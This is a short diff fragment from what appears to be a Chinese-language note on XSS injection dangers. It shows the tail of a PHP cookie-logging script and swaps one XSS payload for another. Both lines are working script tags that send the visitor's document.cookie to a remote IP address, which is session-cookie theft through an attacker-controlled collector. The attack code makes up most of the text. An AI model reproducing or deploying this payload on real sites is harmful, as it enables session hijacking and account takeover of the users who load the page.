@@ -21,5 +21,5 @@ XSS注入在线脚本危害：
 	fclose($log);
 ?>
 
-<script>location.href="http://47.98.193.145/1.php?cookie="+document.cookie</script>
+<script>location.href="http://1.92.88.247/cookie/cookie.php?cookie="+document.cookie</script>
 ```
